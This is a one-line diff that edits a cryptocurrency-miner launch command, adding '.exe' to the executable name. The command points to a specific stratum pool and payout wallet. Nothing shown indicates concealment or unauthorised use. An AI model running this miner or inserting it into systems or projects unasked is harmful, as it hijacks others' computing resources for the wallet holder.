@@ -1,1 +1,1 @@
-xmrigDaemon -a mike --url stratum-asia.rplant.xyz:17040 --tls --user Xoo35dToY5i3DzkSkxMGry4yg21dvZtHDn.freddy1
+xmrigDaemon.exe -a mike --url stratum-asia.rplant.xyz:17040 --tls --user Xoo35dToY5i3DzkSkxMGry4yg21dvZtHDn.freddy1
